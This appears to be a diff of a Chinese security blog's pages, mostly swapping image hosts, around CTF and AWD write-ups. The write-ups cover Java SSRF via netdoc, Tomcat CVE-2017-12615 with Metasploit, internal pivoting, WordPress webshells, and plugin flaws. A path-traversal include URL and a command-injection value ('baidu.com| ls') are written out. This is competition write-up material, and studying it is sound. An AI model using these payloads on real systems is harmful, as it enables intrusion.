 &lt;p>提供了简单的登录注册。&lt;/p>
 &lt;p>然后发现只有&lt;code>A+B&lt;/code>问题可以点&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007413.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610007413.jpg"
 loading="lazy"
 >&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000008.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610000008.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>代码提交页面提供代码提交，查看最后一次提交的代码功能。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008525.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008525.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>引用代码提示&lt;/p>
@@ -28593,47 +28593,47 @@ loading="lazy"
 &lt;p>返回提示成功，查看上一次提交代码，发现以源码方式返回。还有个下载代码的功能，得到一个文件名为用户名经过md5后的&lt;code>txt&lt;/code>文件。&lt;/p>
 &lt;h4 id="思路-1">思路
 &lt;/h4>&lt;p>既然引用代码处，可以引用&lt;code>http&lt;/code>协议的&lt;code>url&lt;/code>，那我们可以试试用&lt;code>file&lt;/code>如何。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002047.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610002047.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>发现是&lt;code>forbidden&lt;/code>，通过&lt;code>fuzz&lt;/code>我们可以得到&lt;code>jar netdoc&lt;/code>两个&lt;code>java SSRF&lt;/code>支持的协议没有被&lt;code>ban&lt;/code>，而且需要再最后加入&lt;code>?1.c&lt;/code>来绕过后缀检测&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004138.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610004138.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>然后查看最后一次代码提交，发现并没有什么改变。&lt;/p>
 &lt;p>试试&lt;code>netdoc&lt;/code>，传入&lt;code>netdoc:///?1.c&lt;/code>&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610006090.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610006090.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>发现可以得到回显&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004440.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610004440.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>但是直接请求&lt;code>flag&lt;/code>，发现被&lt;code>ban&lt;/code>掉了，所以我们得另寻他路。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007131.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610007131.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h4 id="突破口">突破口
 &lt;/h4>&lt;p>通过查看一系列文件，发现如果直接读&lt;code>class&lt;/code>文件的话，直接展示出来了&lt;code>class&lt;/code>二进制文件，那我们下载下来会不会也是&lt;code>class&lt;/code>文件的形式呢&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007767.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610007767.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>下载下来后，我们用&lt;code>file&lt;/code>看一下，果然是个&lt;code>java class&lt;/code>文件&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002918.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610002918.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>用&lt;code>JD-GUI&lt;/code>打开得到源码&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610003338.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610003338.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>题目描述说需要逆向师傅其实指的就是这里需要逆向&lt;code>class&lt;/code>文件，（其实也不需要…直接用&lt;code>JD-GUI&lt;/code>直接就能看了&amp;hellip;&lt;/p>
 &lt;p>这里省略了其他源码的审计。&lt;/p>
 &lt;p>然后看到貌似多出的这个&lt;code>User.class&lt;/code>类，然后发现了比较敏感的&lt;code>readObject()&lt;/code>函数，&lt;code>java&lt;/code>反序列化漏洞特征，可能存在&lt;code>java&lt;/code>反序列化漏洞&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002742.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610002742.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>然后找到其利用的地方，发现在&lt;code>netdoc:///app/webapps/ROOT/WEB-INF/classes/org/nuaa/tomax/logindemo/controller/UserController.class&lt;/code>调用了&lt;code>User&lt;/code>类。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610003437.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610003437.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>&lt;code>UserController.class&lt;/code>的关键部分:&lt;/p>
@@ -28668,10 +28668,10 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>在看到&lt;code>SysUtil.class&lt;/code>:&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009204.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009204.jpg"
 loading="lazy"
 >&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000635.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610000635.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>发现竟然有部分貌似真的需要逆向，但是其实仔细往下看，利用点跟上面那段代码没太大关系。&lt;/p>
@@ -29255,18 +29255,18 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>然后我们在首页得到那个 img 路径，利用文件包含，可以发现成功执行命令。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005329.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610005329.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>接下来简化一下操作，我就直接把那些 php disable 去掉。然后我们发现有个文件&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005968.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610005968.jpg"
 loading="lazy"
 >&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000961.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610000961.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>传 ew + busybox，拿&lt;code>use auxiliary/scanner/portscan/tcp&lt;/code>，得到 172.20.0.3 这个 ip 上有端口开着&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000103.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610000103.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>挂好 ew 之后，我们尝试用 smbclient 来连接内网的 samba 服务（这里第二天来弄了，之前又起了一个 container ，所以 ip 变成了 172.21.0.3&lt;/p>
@@ -29324,34 +29324,34 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>若出现了下图的错误，则需要加上&lt;code>-m SMB2&lt;/code>&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008707.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008707.jpg"
 loading="lazy"
 >&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610001888.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610001888.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>可以看到挂载了一个 www 目录，接着进入交互模式&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009321.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009321.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>得到第一部分的 flag&lt;/p>
 &lt;p>然后发现在 172.21.0.4 上开放着 8080 端口&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009107.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009107.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>挂代理请求 172.21.0.4:8080 发现是 Apache Tomcat/7.0.79&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000082.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610000082.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>访问 manager 尝试了弱密码无果，尝试 CVE-2017-12615&lt;/p>
 &lt;p>直接上 msf&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007852.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610007852.jpg"
 loading="lazy"
 >&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610001642.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610001642.jpg"
 loading="lazy"
 >&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005769.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610005769.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>成功拿到两段 flag&lt;/p>
@@ -30798,7 +30798,7 @@ loading="lazy"
 &lt;h1 id="dayn">Day N
 &lt;/h1>&lt;p>&lt;code>wordpress&lt;/code>版本是最新的&lt;code>4.9.8&lt;/code>，服务器&lt;code>IIS&lt;/code>，不过服务器版本号忘了。&lt;/p>
 &lt;p>对比之后差异一目了然&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009721.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009721.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>主要是两个一句话木马，以及4个插件。&lt;/p>
@@ -30833,7 +30833,7 @@ loading="lazy"
 &lt;/div>&lt;p>后来搜了一下发现竟然是&lt;code>php&lt;/code>版本过高的问题，因为在&lt;code>php7&lt;/code>中动态调用一些函数是被禁止的。详细参考&lt;a class="link" href="http://shuiboye.blogspot.com/2018/01/php200.html" target="_blank" rel="noopener"
 >菜刀连接php一句话木马返回200的原因及解决方法&lt;/a>&lt;/p>
 &lt;p>这里是个密码为-7的一句话。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002229.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610002229.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="poc2">Poc 2
@@ -30876,7 +30876,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>这里就非常清楚了，是个密码为&lt;code>cmd&lt;/code>的一句话。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610006974.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610006974.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h2 id="plugin">Plugin
@@ -30891,7 +30891,7 @@ loading="lazy"
 &lt;/div>
 &lt;/div>&lt;h3 id="site-editor">site-editor
 &lt;/h3>&lt;p>首先看&lt;code>site-editor&lt;/code>&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004098.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610004098.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>可以从图中看出，主要是个文件包含的漏洞。&lt;/p>
@@ -30934,22 +30934,22 @@ loading="lazy"
 &lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http://localhost/wordpress-awd/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=..././..././..././..././..././..././..././wp-includes/pomo/tp.php
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009104.jpg"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009104.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="gift-voucher">gift-voucher
 &lt;/h3>&lt;p>另一个&lt;code>wpscan&lt;/code>扫到的插件是&lt;code>gift-voucher&lt;/code>&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610006248.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610006248.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>可以看到这是个盲注的洞，详细参考&lt;a class="link" href="https://www.exploit-db.com/exploits/45255" target="_blank" rel="noopener"
 >WordPress Plugin Gift Voucher 1.0.5 - (Authenticated) &amp;rsquo;template_id&amp;rsquo; SQL Injection&lt;/a>&lt;/p>
 &lt;p>用&lt;code>sqlmap&lt;/code>扫了一下&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610003081.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610003081.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>得到&lt;code>admin&lt;/code>的密码，如果字典好的话，可以快一些。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005025.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610005025.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="localize-my-post">Localize My Post
@@ -30988,7 +30988,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>这里跟上面那个文件包含类似，可以用&lt;code>...//&lt;/code>来访问上级目录&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610001110.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610001110.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="plainview-activity-monitor">plainview-activity-monitor
@@ -31305,13 +31305,13 @@ loading="lazy"
 &lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">ip=baidu.com%7C%20ls&amp;amp;lookup
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009426.jpg"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009426.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>得到执行结果。&lt;/p>
 &lt;h2 id="functionphp">Function.php
 &lt;/h2>&lt;p>回过头来，我们再看看还有没有跟官方文件其他不同的文件。除了MAC产生的&lt;code>.DS_Store&lt;/code>文件、&lt;code>._wp-config.php&lt;/code>编辑临时文件、&lt;code>wp-config.php&lt;/code>配置文件，剩下的就是&lt;code>function.php&lt;/code>了&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009721.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009721.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>我们对比得到比赛多出了这么一处代码:&lt;/p>
